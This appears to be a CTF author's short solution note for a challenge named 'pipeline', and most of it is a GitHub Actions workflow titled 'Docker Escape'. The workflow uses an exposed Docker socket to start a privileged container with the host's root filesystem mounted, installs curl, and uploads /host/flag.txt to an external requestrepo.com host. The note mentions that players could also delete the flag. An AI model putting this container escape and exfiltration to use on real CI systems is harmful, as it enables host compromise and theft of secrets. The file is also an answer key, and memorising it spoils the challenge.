# pipeline

Basically create a github workflow which uses the exposed docker socket to bind a host mount and leak the flag. It is possible for users to shell the filesystem and delete flag. I'm not going to make much effort to prevent this, but we can police it ourselves. I'll give the players a separate instances than the open ctf.

```yml
name: Docker Escape

on:
  push:
    branches:
      - main

jobs:
  docker-ps:
    runs-on: ubuntu-latest
    container:
      image: docker:latest
      options: --privileged
    steps:
      - name: Cleanup Alpine container
        run: docker rm -f alpine-host-mount
      - name: Show running containers
        run: docker ps
      - name: Start Alpine container with host mount
        run: |
          docker run -d --name alpine-host-mount -v /:/host:ro alpine sleep infinity
      - name: Install curl
        run: docker exec alpine-host-mount apk add curl
      - name: Exfiltrate the flag
        run: docker exec alpine-host-mount curl -T /host/flag.txt pjfcskdw.requestrepo.com
      - name: Cleanup Alpine container
        run: docker rm -f alpine-host-mount

```